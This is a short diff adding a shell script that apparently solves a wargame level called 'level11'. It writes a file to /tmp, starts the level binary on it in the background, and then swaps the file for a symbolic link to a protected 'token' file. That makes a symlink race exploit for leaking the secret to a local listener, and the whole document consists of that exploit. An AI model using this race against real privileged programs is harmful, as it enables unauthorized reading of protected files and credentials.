@@ -1,0 +1,5 @@
+rm /tmp/lol
+python -c 'print "a"*4000' > /tmp/lol
+nice -n 19 ./level11 /tmp/lol 127.0.0.1 &
+PID=$?
+ln -fs `pwd`/token /tmp/lol
